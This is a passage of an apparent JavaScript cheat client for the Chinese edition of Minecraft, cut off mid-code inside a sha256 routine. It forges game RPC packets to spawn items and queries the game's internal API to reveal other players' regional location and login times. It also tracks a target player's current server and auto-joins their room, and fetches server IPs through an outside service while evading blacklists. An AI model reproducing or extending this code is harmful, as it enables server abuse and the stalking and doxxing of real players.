                    _packet.sendPyRpcPacket(98247598, `{\"type\":\"array\",\"value\":[{\"type\":\"binary\",\"value\":\"c\"},{\"type\":\"array\",\"value\":[{\"type\":\"uint\",\"value\":${i}},{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"playerId\"},\"value\":{\"type\":\"binary\",\"value\":\"${self_id}\"}},{\"key\":{\"type\":\"binary\",\"value\":\"slot\"},\"value\":{\"type\":\"binary\",\"value\":\"itemBtn${l}\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isNewRequest\"},\"value\":{\"type\":\"boolean\",\"value\":true}},{\"key\":{\"type\":\"binary\",\"value\":\"item\"},\"value\":{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"count\"},\"value\":{\"type\":\"uint\",\"value\":42}},{\"key\":{\"type\":\"binary\",\"value\":\"newItemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:gray_wool\"}},{\"key\":{\"type\":\"binary\",\"value\":\"modItemId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"enchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"durability\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"itemId\"},\"value\":{\"type\":\"int\",\"value\":-553}},{\"key\":{\"type\":\"binary\",\"value\":\"customTips\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"extraId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"newAuxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"modEnchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"modId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"userData\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isDiggerItem\"},\"value\":{\"type\":\"boolean\",\"value\":false}},{\"key\":{\"type\":\"binary\",\"value\":\"itemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:wool\"}},{\"key\":{\"type\":\"binary\",\"value\":\"auxValue\"},\"value\":{\"type\":\"uint\",\"value\":7}},{\"key\":{\"type\":\"binary\",\"value\":\"showInHand\"},\"value\":{\"type\":\"boolean\",\"value\":true}}]}}]}]},{\"type\":\"nil\"}]}`);
                }
            }
            _v8.gc();
            return true;
        }
        if (ColorChat_Enabled) {
            const colors = ["§a", "§b", "§c", "§d", "§e"];
            let coloredMessage = "";
            let lastColor = "";
            for (let i = 0; i < message.length; i++) {
                let availableColors = colors.filter(color => color !== lastColor);
                let randomColor = availableColors[Math.floor(Math.random() * availableColors.length)];
                coloredMessage += randomColor + message[i];
                lastColor = randomColor;
            }
            _minecraft.sendChatMessage(coloredMessage);
            return true;
        }
    } catch (e) {}
    return false;
}

/*@AI聊天*/
function handleAIChat(message) {
    if (message === " ") {
        _minecraft.clientMessage('§c消息不能为空');
        return;
    }
    if (AIChat_Think) {
        _minecraft.clientMessage('§c请等待AI思考完成');
        return;
    }
    AIChat_Think = true;
    _minecraft.clientMessage((AIChat_Button ? '§f[AI] ' : '§f') + '正在思考中...');
    _https.get('http://api.qingyunke.com/api.php?key=free&appid=0&msg=' + message, Get_Type, function(code, response) {
        AIChat_Think = false;
        if (!response) {
            _minecraft.clientMessage('§c' + (AIChat_Button ? '[AI] ' : '') + '请求失败');
            return;
        }
        _minecraft.clientMessage((AIChat_Button ? '§f[AI]§f ' : '') + response);
        const date = new Date();
        const datePart = `${date.getFullYear()}年${(date.getMonth() + 1).toString().padStart(2, '0')}月${date.getDate().toString().padStart(2, '0')}日`;
        const hours = date.getHours();
        const period = hours < 6 ? '凌晨' : hours < 12 ? '上午' : hours < 18 ? '下午' : '晚上';
        const twelveHour = hours % 12 === 0 ? 12 : hours % 12;
        const timePart = `${period}${twelveHour.toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
        const timestamp = `${datePart} ${timePart}`;
        const name = getEntityName(self_id);
        const logEntry = `${timestamp}\n<${name}> ${message}\n[AI] ${response}`;
        const content = _fs.read(ChatRecord);
        if (_fs.exists(ChatRecord)) {
            _fs.write(ChatRecord, `${content}${logEntry}`);
        } else {
            _fs.write(ChatRecord, logEntry);
        }
    });
}

function AllAIChat(name, message) {
    if (message === " ") {
        _minecraft.sendChatMessage('§c消息不能为空');
        return;
    }
    if (AIChat_Think) {
        return;
    }
    AIChat_Think = true;
    _https.get("http://api.qingyunke.com/api.php?key=free&appid=0&msg=" + message, Get_Type, function(code, response) {
        AIChat_Think = false;
        if (!response) {
            _minecraft.clientMessage('§c' + (AIChat_Button ? '[AI] ' : '') + '请求失败');
            return;
        }
        _minecraft.sendChatMessage((AIChat_Button ? '§f§f§f§f[AI]§f ' : '§f§f§f§f') + "@" + name + " " + response);
        const date = new Date();
        const datePart = `${date.getFullYear()}年${(date.getMonth() + 1).toString().padStart(2, '0')}月${date.getDate().toString().padStart(2, '0')}日`;
        const hours = date.getHours();
        const period = hours < 6 ? '凌晨' : hours < 12 ? '上午' : hours < 18 ? '下午' : '晚上';
        const twelveHour = hours % 12 === 0 ? 12 : hours % 12;
        const timePart = `${period}${twelveHour.toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
        const timestamp = `${datePart} ${timePart}`;
        const logEntry = `${timestamp}\n<${name}> ${message}\n[AI] ${response}`;
        const content = _fs.read(ChatRecord);
        if (_fs.exists(ChatRecord)) {
            _fs.write(ChatRecord, `${content}${logEntry}`);
        } else {
            _fs.write(ChatRecord, logEntry);
        }
    });
}
/*#AI聊天*/

function onClientMessageEvent(name, message) {
    if (AntiText) {
        let now = Date.now();
        if (now - last_msg_time < 1000 && at_current >= at_max_text) {
            return true;
        }
        if (message.length > at_max_len) {
            return true;
        }
        at_current++;
        last_msg_time = now;
        if (AntiText) _minecraft.clientMessage("<" + name + "> " + message);
    }
    if (AIChat_Whole && AIChat_Enabled && !message.includes('§f§f§f§f')) {
        AllAIChat(name, message);
    }
    return false;
}

function CoordHUD() {
    if (CoordHUD_Enabled) {
        if (TextPos >= 0) {
            updateTextPosition(TextPos, TextPosX, TextPosY);
            updateTextContent(TextPos, "位置:" + Math.floor(self_pos.x) + ", " + Math.floor(self_pos.y - 1.8) + ", " + Math.floor(self_pos.z));
        }
    }
}

function TimesTurn(time) {
    if (time < 10000000000) time *= 1000;
    const date = new Date(time);
    const beijingOffset = 8 * 60;
    const localOffset = date.getTimezoneOffset();
    const beijingTime = new Date(date.getTime() + (beijingOffset + localOffset) * 60 * 1000);
    return `${beijingTime.getFullYear()}-${String(beijingTime.getMonth() + 1).padStart(2, '0')}-${String(beijingTime.getDate()).padStart(2, '0')} ${String(beijingTime.getHours()).padStart(2, '0')}:${String(beijingTime.getMinutes()).padStart(2, '0')}:${String(beijingTime.getSeconds()).padStart(2, '0')}`;
}

function getPlayerInformation() {
    const form = {
        "type": "custom_form",
        "title": "查询玩家信息",
        "content": [{
            "type": "input",
            "text": "请输入UID",
            "default": ""
        }]
    };
    _gui.addForm(JSON.stringify(form), function(playerName) {
        try {
            const target_player_name = playerName;
            if (!target_player_name) {
                _minecraft.clientMessage("§c错误：请输入UID");
                return;
            }
            const requestData = {
                "entity_id": target_player_name
            };
            curl_post_game_api(
                "https://g79apigatewayobt.minecraft.cn/user-detail/query/other",
                JSON.stringify(requestData),
                function(result_code, response) {
                    try {
                        const data = JSON.parse(response);
                        if (data.message === "正常返回") {
                            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/user-detail", JSON.stringify(requestData), function(code, res) {
                                const Data = JSON.parse(res);
                                if ("lbs_info" in data.entity) {
                                    const loc = data.entity.lbs_info || {};
                                    _minecraft.clientMessage("§a查询成功 玩家信息如下:\n§e名称:" + data.entity.nickname + "\nUID:" + data.entity.id + "\n等级:" + data.entity.pe_growth.lv + "\n地区:" + (loc.province ? `${loc.province} ${loc.city||''} ${loc.area||''}` : "无记录") + "\n注册时间:" + TimesTurn(Data.entity.register_time) + "\n登录时间:" + TimesTurn(Data.entity.login_time));
                                } else {
                                    _minecraft.clientMessage("§a查询成功 玩家信息如下: §e\n名称:" + data.entity.nickname + "\nUID:" + data.entity.id + "\n等级:" + data.entity.pe_growth.lv + "\n地区:无记录" + "\n注册时间:" + TimesTurn(Data.entity.register_time) + "\n登录时间:" + TimesTurn(Data.entity.login_time));
                                }
                            });
                        } else {
                            _minecraft.clientMessage(`§c查询失败: ${data.message || "未找到此玩家"}`);
                        }
                    } catch (e) {
                        _minecraft.clientMessage("§c响应解析错误: " + e.message);
                    }
                }
            );
        } catch (e) {}
    });
}

function getPlayeruid() {
    const form = {
        "type": "custom_form",
        "title": "查询玩家UID",
        "content": [{
            "type": "input",
            "text": "请输入玩家名称",
            "default": ""
        }]
    };
    _gui.addForm(JSON.stringify(form), function(playerName) {
        const target_player_name = playerName;
        if (!target_player_name) {
            _minecraft.clientMessage("§c错误：请输入玩家名称");
            return;
        }
        const requestData = {
            "name_or_mail": target_player_name
        };
        curl_post_game_api(
            "https://g79apigatewayobt.minecraft.cn/user-search-friend",
            JSON.stringify(requestData),
            function(result_code, response) {
                try {
                    const data = JSON.parse(response);
                    if (data.message === "正常返回" && data.entities && data.entities.length > 0) {
                        const uid = data.entities[0].uid;
                        _minecraft.clientMessage(`§a查询成功 玩家UID: §e${uid}`);
                    } else {
                        _minecraft.clientMessage(`§c查询失败: ${data.message || "未找到此玩家"}`);
                    }
                } catch (e) {
                    _minecraft.clientMessage("§c响应解析错误: " + e.message);
                }
            }
        );
    });
}

function ChangeName() {
    const form = {
        "type": "custom_form",
        "title": "修改名称",
        "content": [{
            "type": "input",
            "text": "请输入名称",
            "default": ""
        }]
    };
    _gui.addForm(JSON.stringify(form), function(UserName) {
        if (!UserName) {
            return;
        }
        const seed = md5(generateUUID() + "SeedTime");
        const token = md5(FileContent + seed + UserName + "Time");
        _https.get(`http://time.fuhongweb.cn/ChatRoom.php?update_username=1&${FileContent}&seed=${seed}&token=${token}&new_username=${UserName}`, {}, function(code, response, headers) {
            const Data = JSON.parse(XorDecrypt(response, "f8f617eaaf7eb5580cd4abb3ce2f8953"));
            if (Data.success) {
                _minecraft.clientMessage(`§e${Data.message}`);
            } else {
                _minecraft.clientMessage(`§c修改失败`);
            }
        });
    });
}

function UpdateUser() {
    const form = {
        "type": "custom_form",
        "title": "更新账号",
        "content": [{
                "type": "input",
                "text": "请输入账号",
                "default": ""
            },
            {
                "type": "input",
                "text": "请输入更新密钥",
                "default": ""
            }
        ]
    };
    _gui.addForm(JSON.stringify(form), function(UserName, UpdateKey) {
        if (!UpdateKey || !UserName) return;
        let EncryptData = XorEncrypt(JSON.stringify({
            UpdateKey: UpdateKey,
            User: UserName
        }), "a0019e6b8dacb71672b7a00ae66983b1");
        _https.post("http://time.fuhongweb.cn/UpdateUser", {}, EncryptData, function(code, response, headers) {
            const Data = JSON.parse(XorDecrypt(response, "a0019e6b8dacb71672b7a00ae66983b1"));
            if (Data.code === 200 && Data.message) {
                _minecraft.clientMessage(`§e${Data.message}`);
            } else {
                _minecraft.clientMessage(`§c${Data.message}`);
            }
        });
    });
}

function getPlayerServer(UID, mode, isGame_id = false, callback) {
    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/user-else-detail-many", JSON.stringify({
        "with_game_state": true,
        "uids": UID,
        "with_dynamic_head_img": 1
    }), function(res_code, server_id_response) {
        try {
            const data = JSON.parse(server_id_response);
            if (data.message === "正常返回" && data.entities) {
                if (data.entities.length > 0 && data.entities[0].user_game_info) {
                    const gameId = data.entities[0].user_game_info["game-id"];
                    if (gameId) {
                        if (isGame_id) {
                            callback(null, {
                                type: "room",
                                id: gameId
                            });
                            return;
                        }
                        if (isNaN(gameId)) {
                            callback(null, {
                                type: "single",
                                id: gameId
                            });
                            return;
                        }
                        curl_post_game_api("https://g79apigatewayobt.minecraft.cn/rental-server-details/get", JSON.stringify({
                            "server_id": gameId
                        }), function(result_code, result_response) {
                            const result_server = JSON.parse(result_response);
                            if (result_server && result_server.entity && result_server.entity.name) {
                                callback(null, {
                                    type: "rental",
                                    id: result_server.entity.name
                                });
                                return;
                            }
                            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/domain-server/get-server-detail", JSON.stringify({
                                "sid": gameId
                            }), function(sidu_code, sidu_response) {
                                const sidu_server = JSON.parse(sidu_response);
                                if (sidu_server && sidu_server.entity && sidu_server.entity.name) {
                                    callback(null, {
                                        type: "domain",
                                        id: sidu_server.entity.name
                                    });
                                    return;
                                }
                                curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room/get", JSON.stringify({
                                    "room_id": gameId
                                }), function(room_code, room_response) {
                                    const data_Server = JSON.parse(room_response);
                                    if (data_Server && data_Server.entity && data_Server.entity.room_name) {
                                        callback(null, {
                                            type: "room",
                                            id: data_Server.entity.room_name
                                        });
                                        return;
                                    }
                                    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/pe-game/query/get-server-detail", JSON.stringify({
                                        "item_id": gameId,
                                        "channel_id": 5
                                    }), function(nw_code, nw_response) {
                                        const nwData = JSON.parse(nw_response);
                                        if (nwData && nwData.entity && nwData.entity.res_name) {
                                            callback(null, {
                                                type: "network",
                                                id: nwData.entity.res_name
                                            });
                                            return;
                                        } else if (!isNaN(gameId)) {
                                            callback(null, {
                                                type: "local",
                                                id: gameId
                                            });
                                            return;
                                        } else {
                                            callback(null, {
                                                type: "error",
                                                id: null
                                            });
                                            return;
                                        }
                                    });
                                });
                            });
                        });
                    } else {
                        callback(null, {
                            type: "offline",
                            id: null
                        });
                        return;
                    }
                } else {
                    callback(null, {
                        type: "not_found",
                        id: null
                    });
                    return;
                }
            } else {
                callback(null, {
                    type: "error",
                    id: null
                });
                return;
            }
        } catch (e) {
            callback(`§c响应解析错误: ` + e.message, null);
            return;
        }
    });
}

function getServerFlag() {
    const form = {
        "type": "custom_form",
        "title": "查询玩家游玩服务器",
        "content": [{
            "type": "input",
            "text": "请输入UID",
            "default": ""
        }]
    };
    _gui.addForm(JSON.stringify(form), function(UID) {
        try {
            if (!UID) {
                _minecraft.clientMessage("§c错误：请输入玩家UID");
                return;
            }
            if (isNaN(UID)) {
                _minecraft.clientMessage("§c错误：请输入正确UID");
                return;
            }
            getPlayerServer(UID, true, false, function(Error, Data) {
                if (Error) {
                    _minecraft.clientMessage(Error);
                } else {
                    let displayText = "";
                    switch (Data.type) {
                        case "room":
                            displayText = `§a查询成功: §e房间号: ${Data.id}`;
                            break;
                        case "single":
                            displayText = "§a查询成功: §e正在游玩单人存档";
                            break;
                        case "rental":
                            displayText = `§a查询成功: §e服务器号: ${Data.id}`;
                            break;
                        case "domain":
                            displayText = `§a查询成功: §e山头服务器: ${Data.id}`;
                            break;
                        case "network":
                            displayText = `§a查询成功: §e网络服名称: ${Data.id}`;
                            break;
                        case "local":
                            displayText = `§a查询成功: §e本地联机房间号: ${Data.id}`;
                            break;
                        case "offline":
                            displayText = "§c查询失败: 玩家不在线或不在游戏内";
                            break;
                        case "not_found":
                            displayText = "§c查询失败: 未找到此玩家";
                            break;
                        case "error":
                            displayText = "§c查询失败: 原因未知";
                            break;
                        default:
                            displayText = "§c查询失败";
                    }
                    _minecraft.clientMessage(displayText);
                }
            });
        } catch (e) {
            _minecraft.clientMessage("§c错误: " + e.message);
        }
    });
}

function QueryJoinRoom(roomId, password, callback) {
    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter", JSON.stringify({
        "password": password,
        "room_id": roomId,
        "lobby_manifest_version": "",
        "check_visibilily": 1
    }), function(enterRoomCode, enterRoomData) {
        try {
            const enterRoomResult = JSON.parse(enterRoomData);
            if (enterRoomResult.message !== "正常返回") {
                callback(enterRoomResult.message || "进入房间失败", null);
                return;
            }
            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-game-enter", JSON.stringify({}), function(enterGameCode, enterGameData) {
                try {
                    const enterGameResult = JSON.parse(enterGameData);
                    if (enterGameResult.message !== "正常返回") {
                        callback(enterGameResult.message || "进入游戏失败", null);
                        return;
                    }
                    const server_ip = enterGameResult.entity.server_host;
                    const server_Port = enterGameResult.entity.server_port;
                    const serverAddress = `${server_ip}:${server_Port}`;
                    _minecraft.clientMessage("§e获取到房间IP: " + serverAddress);
                    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/leave-room", JSON.stringify({
                        "team_quit": false,
                        "room_id": roomId
                    }), function(sw_code, sw_res) {});
                    callback(null, serverAddress);
                } catch (e) {
                    callback("解析游戏进入响应失败: " + e.message, null);
                }
            });
        } catch (e) {
            callback("解析房间进入响应失败: " + e.message, null);
        }
    });
}

let ServerChecker_Timer = 0;

function ServerChecker() {
    if (ServerChecker_Enabled) {
        ServerChecker_Timer++;
        if (ServerChecker_Timer >= 40) {
            ServerChecker_Timer = 0;
            getPlayerServer(ServerChecker_UID, false, false, function(Error, Data) {
                if (!Error) {
                    if (Data.type === "offline" && Data.type !== ServerChecker_Server) {
                        _app.showToast("目标玩家不在线或不在游戏内");
                        ServerChecker_Server = Data.type;
                        return;
                    } else if (Data.type === "not_found") {
                        _app.showToast("目标玩家不存在");
                        ServerChecker_Server = "";
                        return;
                    } else if (Data.type === "error") {
                        if (Data.type !== ServerChecker_Server) {
                            _app.showToast("查询失败");
                            ServerChecker_Server = Data.type;
                        }
                        return;
                    }
                    let displayText = "";
                    switch (Data.type) {
                        case "room":
                            displayText = "房间号: " + Data.id;
                            break;
                        case "single":
                            displayText = "单人游戏";
                            break;
                        case "rental":
                            displayText = "服务器号: " + Data.id;
                            break;
                        case "domain":
                            displayText = "山头服务器: " + Data.id;
                            break;
                        case "network":
                            displayText = "网络服名称: " + Data.id;
                            break;
                        case "local":
                            displayText = "本地联机: " + Data.id;
                            break;
                        default:
                            displayText = "未知游戏模式";
                    }
                    if (Data.type !== ServerChecker_Server) {
                        ServerChecker_Server = Data.type;
                        _app.showToast(displayText);
                        if (Data.type === "room") {
                            getPlayerServer(ServerChecker_UID, false, true, function(Error, RoomData) {
                                if (!Error && RoomData.type === "room") {
                                    QueryJoinRoom(RoomData.id, "", function(error, serverAddress) {
                                        if (!error && serverAddress) {
                                            const [ip, port] = serverAddress.split(":");
                                            join_world(RoomData.id, ip, parseInt(port));
                                        } else {
                                            _minecraft.clientMessage("§c自动加入房间失败: " + (error || "未知错误"));
                                        }
                                    });
                                }
                            });
                        }
                    }
                }
            });
        }
    }
}

function getServer() {
    const form = {
        "type": "custom_form",
        "title": "查询服务器",
        "content": [{
            "type": "input",
            "text": "请输入服务器号",
            "default": ""
        }]
    };
    _gui.addForm(JSON.stringify(form), function(playerName) {
        const target_player_name = playerName;
        if (!target_player_name) {
            _minecraft.clientMessage("§c错误：请输入服务器号");
            return;
        }
        const requestData = {
            "server_name": target_player_name
        };
        curl_post_game_api(
            "https://g79apigatewayobt.minecraft.cn/rental-server/query/search-by-name",
            JSON.stringify(requestData),
            function(result_code, response) {
                try {
                    const data = JSON.parse(response);
                    if (data.message === "正常返回" && data.entities && data.entities.length > 0) {
                        _minecraft.clientMessage(`§a查询成功\n§e服务器名称: ${data.entities[0].server_name || "无"}\n服务器号: ${data.entities[0].name}\n服务器ID: ${data.entities[0].entity_id}\n服主UID: ${data.entities[0].owner_id}\n服务器版本: ${data.entities[0].mc_version}\n服务器当前人数: ${data.entities[0].player_count}\n服务器最大人数: ${data.entities[0].capacity}`);
                    } else {
                        _minecraft.clientMessage(`§c未找到此服务器`);
                    }
                } catch (e) {
                    _minecraft.clientMessage("§c响应解析错误: " + e.message);
                }
            }
        );
    });
}

function getServerIP() {
    const form = {
        "type": "custom_form",
        "title": "查询服务器IP",
        "content": [{
                "type": "input",
                "text": "请输入服务器号",
                "default": ""
            },
            {
                "type": "input",
                "text": "请输入密码[无密码请留空]",
                "default": ""
            }
        ]
    };
    _gui.addForm(JSON.stringify(form), function(ServerId, Pwd) {
        if (!ServerId) {
            _minecraft.clientMessage("§c错误：请输入服务器号");
            return;
        }
        curl_post_game_api(
            "https://g79apigatewayobt.minecraft.cn/rental-server/query/search-by-name",
            JSON.stringify({
                "server_name": ServerId
            }),
            function(game_code, game_response) {
                try {
                    const data = JSON.parse(game_response);
                    if (!data.entities || data.entities.length === 0) {
                        _minecraft.clientMessage("§c错误：未找到该服务器");
                        return;
                    }
                    const serverId = data.entities[0].entity_id;
                    const queryUrl = `http://time.fuhongweb.cn/getServerIP?server_id=${serverId}&pwd=${Pwd || ""}`;
                    _https.get(queryUrl, {}, function(code, response, headers) {
                        if (code !== 200) {
                            return;
                        }
                        const ipRegex = /((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d+/;
                        const ipMatch = response.match(ipRegex);
                        if (response.includes("未到达该房间设定的最低等级")) {
                            _minecraft.clientMessage("§c错误: 服务器设置了等级");
                        } else if (response.includes("密码错误")) {
                            _minecraft.clientMessage("§c错误: 提供的密码错误");
                        } else if (response.includes("黑名单")) {
                            _minecraft.clientMessage("§c错误: 机器人可能被拉入黑名单");
                        } else if (ipMatch) {
                            _minecraft.clientMessage(`§e服务器IP: ${ipMatch[0]}`);
                        } else {
                            _minecraft.clientMessage(`§c错误: 未知的错误`);
                        }
                    });
                } catch (e) {
                    _minecraft.clientMessage(`§c错误: 未知的错误`);
                }
            }
        );
    });
}

function generateVerificationParams(challenge, difficulty) {
    const targetPrefix = '0'.repeat(difficulty);
    let solution = 0;
    const maxAttempts = 10000000;
    let isCanceled = false;
    return {
        promise: new Promise((resolve, reject) => {
            function attempt() {
                if (isCanceled) return;
                if (solution > maxAttempts) {
                    reject("Timeout");
                    return;
                }
                const testString = challenge + ":" + solution;
                const hash = sha256(testString);
                if (hash.startsWith(targetPrefix)) {
                    resolve({
                        verify: '',
                        challenge: challenge,
                        solution: solution
                    });
                } else {
                    solution++;
                    if (solution % 1000 === 0) {
                        setTimeout(attempt, 0);
                    } else {
                        attempt();
                    }
                }
            }
            attempt();
        }),
        cancel: function() {
            isCanceled = true;
        }
    };
}

function sha256(str) {
    function rightRotate(value, amount) {
        return (value >>> amount) | (value << (32 - amount));
    }
    const k = [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2];
    const blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    let h0 = 0x6a09e667,
        h1 = 0xbb67ae85,
        h2 = 0x3c6ef372,
        h3 = 0xa54ff53a,
        h4 = 0x510e527f,
        h5 = 0x9b05688c,
        h6 = 0x1f83d9ab,
        h7 = 0x5be0cd19;
    let bytes = 0,
        start = 0,
        lastByteIndex = 0;
    for (let n = 0; n < str.length; n++) {
        const charCode = str.charCodeAt(n);
        if (charCode < 128) {
            blocks[lastByteIndex >> 2] |= charCode << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
        } else if (charCode < 2048) {
            blocks[lastByteIndex >> 2] |= (192 | charCode >> 6) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | 63 & charCode) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
        } else if (charCode < 55296 || charCode >= 57344) {
            blocks[lastByteIndex >> 2] |= (224 | charCode >> 12) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | charCode >> 6 & 63) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | 63 & charCode) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
        } else {
            const nextChar = str.charCodeAt(++n);
            const codePoint = 65536 + ((1023 & charCode) << 10 | 1023 & nextChar);
            blocks[lastByteIndex >> 2] |= (240 | codePoint >> 18) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | codePoint >> 12 & 63) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | codePoint >> 6 & 63) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
            blocks[lastByteIndex >> 2] |= (128 | 63 & codePoint) << ((3 - lastByteIndex) % 4) * 8;
            lastByteIndex++;
        }
        if (lastByteIndex >= 64) {
            bytes += lastByteIndex - start;
            start = lastByteIndex - 64;
            let a = h0,
                b = h1,
                c = h2,
                d = h3,
                e = h4,
                f = h5,
                g = h6,
                h_val = h7;
            const w = [];
            for (let t = 0; t < 16; t++) w[t] = blocks[t];
            for (let t = 16; t < 64; t++) {
                const s0 = rightRotate(w[t - 15], 7) ^ rightRotate(w[t - 15], 18) ^ (w[t - 15] >>> 3);
                const s1 = rightRotate(w[t - 2], 17) ^ rightRotate(w[t - 2], 19) ^ (w[t - 2] >>> 10);
                w[t] = (w[t - 16] + s0 + w[t - 7] + s1) & 0xffffffff;
            }
            for (let t = 0; t < 64; t++) {
                const S1 = rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25);
                const ch = (e & f) ^ (~e & g);
                const temp1 = (h_val + S1 + ch + k[t] + w[t]) & 0xffffffff;
                const S0 = rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22);
                const maj = (a & b) ^ (a & c) ^ (b & c);
                const temp2 = (S0 + maj) & 0xffffffff;
                h_val = g;
                g = f;
                f = e;
                e = (d + temp1) & 0xffffffff;
                d = c;
                c = b;
                b = a;
                a = (temp1 + temp2) & 0xffffffff;
            }
            h0 = (h0 + a) & 0xffffffff;
            h1 = (h1 + b) & 0xffffffff;
            h2 = (h2 + c) & 0xffffffff;
            h3 = (h3 + d) & 0xffffffff;
            h4 = (h4 + e) & 0xffffffff;
            h5 = (h5 + f) & 0xffffffff;
            h6 = (h6 + g) & 0xffffffff;
            h7 = (h7 + h_val) & 0xffffffff;
            blocks[0] = blocks[16];
            for (let i = 1; i < 16; i++) blocks[i] = 0;
            lastByteIndex = 0;
            start = 0;
        }
    }
    bytes += lastByteIndex - start;
    blocks[lastByteIndex >> 2] |= 0x80 << ((3 - lastByteIndex) % 4) * 8;
    if (lastByteIndex >= 56) {
        let a = h0,
            b = h1,
            c = h2,
            d = h3,
            e = h4,
            f = h5,
            g = h6,
            h_val = h7;
        const w = [];
        for (let t = 0; t < 16; t++) w[t] = blocks[t];
        for (let t = 16; t < 64; t++) {
            const s0 = rightRotate(w[t - 15], 7) ^ rightRotate(w[t - 15], 18) ^ (w[t - 15] >>> 3);
            const s1 = rightRotate(w[t - 2], 17) ^ rightRotate(w[t - 2], 19) ^ (w[t - 2] >>> 10);
            w[t] = (w[t - 16] + s0 + w[t - 7] + s1) & 0xffffffff;
        }
        for (let t = 0; t < 64; t++) {
            const S1 = rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25);
            const ch = (e & f) ^ (~e & g);
            const temp1 = (h_val + S1 + ch + k[t] + w[t]) & 0xffffffff;
            const S0 = rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22);
            const maj = (a & b) ^ (a & c) ^ (b & c);
            const temp2 = (S0 + maj) & 0xffffffff;
            h_val = g;
            g = f;
            f = e;
            e = (d + temp1) & 0xffffffff;
            d = c;
            c = b;
            b = a;
            a = (temp1 + temp2) & 0xffffffff;
        }
        h0 = (h0 + a) & 0xffffffff;
        h1 = (h1 + b) & 0xffffffff;
        h2 = (h2 + c) & 0xffffffff;
        h3 = (h3 + d) & 0xffffffff;
        h4 = (h4 + e) & 0xffffffff;
        h5 = (h5 + f) & 0xffffffff;
        h6 = (h6 + g) & 0xffffffff;
        h7 = (h7 + h_val) & 0xffffffff;
        for (let i = 0; i < 16; i++) blocks[i] = 0;
    }
    blocks[14] = (bytes >>> 29) & 0xffffffff;
    blocks[15] = (bytes << 3) & 0xffffffff;
    let a = h0,
        b = h1,
        c = h2,
        d = h3,
        e = h4,
        f = h5,
        g = h6,
        h_val = h7;
    const w = [];
    for (let t = 0; t < 16; t++) w[t] = blocks[t];
    for (let t = 16; t < 64; t++) {
